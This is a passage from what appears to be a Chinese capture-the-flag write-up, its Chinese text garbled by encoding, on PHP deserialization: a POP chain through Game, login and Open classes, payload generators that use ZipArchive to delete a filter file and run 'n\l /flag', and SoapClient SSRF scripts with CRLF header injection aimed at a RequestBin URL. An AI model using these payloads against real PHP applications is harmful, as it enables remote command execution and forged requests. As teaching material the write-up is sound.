class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>popé“¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Game</span>::<span class="variable constant_">wakeup</span>-&gt;login::<span class="variable constant_">checking</span>-&gt;<span class="title class_">Open</span>::<span class="variable constant_">open</span></span><br></pre></td></tr></table></figure><p>å…ˆè¯»<strong>shell.php</strong>é‡Œçš„å†…å®¹</p><p><code>if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)</code>md5è§£å‡ºæ¥å°±æ˜¯admin</p><p><strong>payload1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<strong>shell.php</strong>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;                                                  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure><p>å†ç»“åˆopenç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;    </span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿…é¡»è¦ä¸å­˜åœ¨waf.txtï¼Œæ‰å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œå°±åªèƒ½ä½¿ç”¨ZipArchive ç±»è°ƒç”¨ä»–çš„openæ–¹æ³•æ¥å°†waf.txtç»™åˆ é™¤</p><p>å³æ„é€ <code>ZipArchive::open(waf.txt, ZipArchive::OVERWRITE)</code></p><p><strong>payload2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåå³å¯åˆ é™¤waf.txt,ç”±äºshell.phpä¸­è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä½¿ç”¨<code>n\l /flag</code>è¯»å–</p><p><strong>payload3</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>=<span class="string">&#x27;n\l /flag&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClient-ç±»è¿›è¡Œ-SSRF"><a href="#SoapClient-ç±»è¿›è¡Œ-SSRF" class="headerlink" title="SoapClient ç±»è¿›è¡Œ SSRF"></a>SoapClient ç±»è¿›è¡Œ SSRF</h2><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041112652.png" alt="image-20221004111236510"></p><p>æœ€ä¸»è¦çš„æ˜¯è¿™ä¸ªç±»é‡Œå¸¦æœ‰ä¸€ä¸ª<code>__call</code>æ–¹æ³•ï¼Œå½“<code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚,æ­£æ˜¯è¿™ä¸ª __call æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚</p><p>soapç±»çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient::SoapClient(mixed $wsdl [ï¼Œarray $options ])</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›åœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œuriæ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨äº†è§£å®Œå‚æ•°ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨è¯¥ç±»æ¥è¿›è¡Œssrfäº†</p><p>é¦–å…ˆç›‘å¬ä¸€ä¸ªç½‘ç«™ï¼Œè¿™é‡Œç”¨çš„æ˜¯<a href="https://requestbin.io/">RequestBin</a></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041117986.png" alt="image-20221004111710824"></p><p><strong>test1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;This is a ssrf test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œtest.phpå</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041120612.png" alt="image-20221004112010496"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¿›è¡Œäº†ssrf</p><p>é…åˆCRLFå¯ä»¥æ’å…¥ä»»æ„HTTPå¤´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRLF æŒ‡çš„æ˜¯å›è½¦ç¬¦(CRï¼ŒASCII 13ï¼Œ\rï¼Œ%0d) å’Œæ¢è¡Œç¬¦(LFï¼ŒASCII 10ï¼Œ\nï¼Œ%0a)ã€‚CRLFæ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ã€‚</span><br></pre></td></tr></table></figure><p><strong>test2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;test\r\nCookie: PHPSESSID=test&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041123899.png" alt="image-20221004112300785"></p><p>æˆåŠŸæ’å…¥è‡ªå®šä¹‰çš„<strong>Cookie</strong></p><p>è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ è¾“çš„æ˜¯POSTæ•°æ®ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦ä»¤<code>Content-Type</code>çš„å€¼ä¸º<code>application/x-www-form-urlencoded</code></p><p>è¿™é‡Œå› 